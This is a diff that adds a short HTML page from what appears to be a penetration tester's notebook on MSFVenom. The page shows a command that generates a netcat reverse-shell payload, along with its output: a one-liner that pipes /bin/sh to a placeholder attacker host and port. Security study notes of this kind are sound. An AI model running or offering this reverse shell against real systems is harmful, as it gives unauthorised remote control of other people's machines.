@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>MSFVenom</title>
+</head><body>Can do more than meterpreter stages<br/>
+See Tools &gt; Frameworks &gt; Metasploit &gt; MSFVenom &gt; <a href="nbk:///ec78ad13-451b-4b81-a1b7-01e6ee1b5bd7">MSFVenom Payloads</a><br/>
+Look for cmd/unix and other payloads that can generate one-liner bind or reverse shells<br/>
+<br/>
+IE: msfvenom -p cmd/unix/reverse_netcat LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; R<br/>
+spits out: mkfifo /tmp/lneo; nc &lt;LIP&gt; &lt;LPORT&gt; 0&lt;/tmp/lneo | /bin/sh &gt;/tmp/lneo 2&gt;&amp;1; rm /tmp/lneo<br/>
+<br/>
+and more!<br/>
+</body></html>
